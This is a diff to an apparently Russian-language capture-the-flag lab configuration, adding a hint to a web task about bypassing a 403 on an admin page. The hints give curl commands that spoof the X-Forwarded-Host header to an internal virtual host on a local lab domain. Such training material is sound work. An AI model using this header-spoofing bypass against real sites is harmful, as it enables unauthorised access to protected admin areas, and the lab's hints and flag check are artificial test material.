@@ -20,6 +20,7 @@ lab:
   files: [task.md]
   check: "grep -q 'nto{' found.txt"
   hints:
+    - "Повторение (`web-waf-bypass`): сначала зафиксируй `curl -s -i 'http://shop.local/admin'` (403), потом подменяй `X-Forwarded-Host`."
     - Прямой доступ: `curl -s -i 'http://shop.local/admin'` → 403.
     - Фронтенд маршрутизирует по Host и доверяет `X-Forwarded-Host`.
     - Подставь внутренний vhost: `curl -s -i 'http://shop.local/admin' -H 'X-Forwarded-Host: internal.shop.local'`.
